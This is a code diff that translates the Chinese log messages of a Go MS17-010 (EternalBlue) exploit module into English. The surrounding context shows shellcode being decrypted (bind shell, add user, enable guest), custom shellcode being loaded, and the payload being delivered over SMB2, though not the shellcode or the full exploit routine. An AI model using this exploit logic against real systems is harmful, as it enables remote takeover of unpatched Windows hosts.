@@ -26,7 +26,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		var err error
 		sc, err = AesDecrypt(sc_enc, key)
 		if err != nil {
-			Common.LogError(fmt.Sprintf("%s MS17-010 解密bind shellcode失败: %v", info.Host, err))
+			Common.LogError(fmt.Sprintf("%s MS17-010 failed to decrypt bind shellcode: %v", info.Host, err))
 			return
 		}
 
@@ -40,7 +40,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		var err error
 		sc, err = AesDecrypt(sc_enc, key)
 		if err != nil {
-			Common.LogError(fmt.Sprintf("%s MS17-010 解密add shellcode失败: %v", info.Host, err))
+			Common.LogError(fmt.Sprintf("%s MS17-010 failed to decrypt add shellcode: %v", info.Host, err))
 			return
 		}
 
@@ -50,7 +50,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		var err error
 		sc, err = AesDecrypt(sc_enc, key)
 		if err != nil {
-			Common.LogError(fmt.Sprintf("%s MS17-010 解密guest shellcode失败: %v", info.Host, err))
+			Common.LogError(fmt.Sprintf("%s MS17-010 failed to decrypt guest shellcode: %v", info.Host, err))
 			return
 		}
 
@@ -59,7 +59,7 @@ func MS17010EXP(info *Common.HostInfo) {
 		if strings.Contains(Common.Shellcode, "file:") {
 			read, err := ioutil.ReadFile(Common.Shellcode[5:])
 			if err != nil {
-				Common.LogError(fmt.Sprintf("MS17010读取Shellcode文件 %v 失败: %v", Common.Shellcode, err))
+				Common.LogError(fmt.Sprintf("MS17010 failed to read shellcode file %v: %v", Common.Shellcode, err))
 				return
 			}
 			sc = fmt.Sprintf("%x", read)
@@ -70,25 +70,25 @@ func MS17010EXP(info *Common.HostInfo) {
 
 	// 验证shellcode有效性
 	if len(sc) < 20 {
-		fmt.Println("无效的Shellcode")
+		fmt.Println("Invalid shellcode")
 		return
 	}
 
 	// 解码shellcode
 	sc1, err := hex.DecodeString(sc)
 	if err != nil {
-		Common.LogError(fmt.Sprintf("%s MS17-010 Shellcode解码失败: %v", info.Host, err))
+		Common.LogError(fmt.Sprintf("%s MS17-010 failed to decode shellcode: %v", info.Host, err))
 		return
 	}
 
 	// 执行EternalBlue漏洞利用
 	err = eternalBlue(address, 12, 12, sc1)
 	if err != nil {
-		Common.LogError(fmt.Sprintf("%s MS17-010漏洞利用失败: %v", info.Host, err))
+		Common.LogError(fmt.Sprintf("%s MS17-010 exploit failed: %v", info.Host, err))
 		return
 	}
 
-	Common.LogSuccess(fmt.Sprintf("%s\tMS17-010\t漏洞利用完成", info.Host))
+	Common.LogSuccess(fmt.Sprintf("%s\tMS17-010\texploit completed", info.Host))
 }
 
 // eternalBlue 执行EternalBlue漏洞利用
@@ -192,7 +192,7 @@ func exploit(address string, grooms int, payload []byte) error {
 	Common.LogSuccess(fmt.Sprintf("NT Status: 0x%08X", ntStatus))
 
 	// 发送payload
-	Common.LogSuccess("开始发送Payload")
+	Common.LogSuccess("Starting payload delivery")
 	body := makeSMB2Body(payload)
 
 	// 分段发送payload
@@ -208,7 +208,7 @@ func exploit(address string, grooms int, payload []byte) error {
 		}
 	}
 
-	Common.LogSuccess("Payload发送完成")
+	Common.LogSuccess("Payload delivery completed")
 	return nil
 }
 
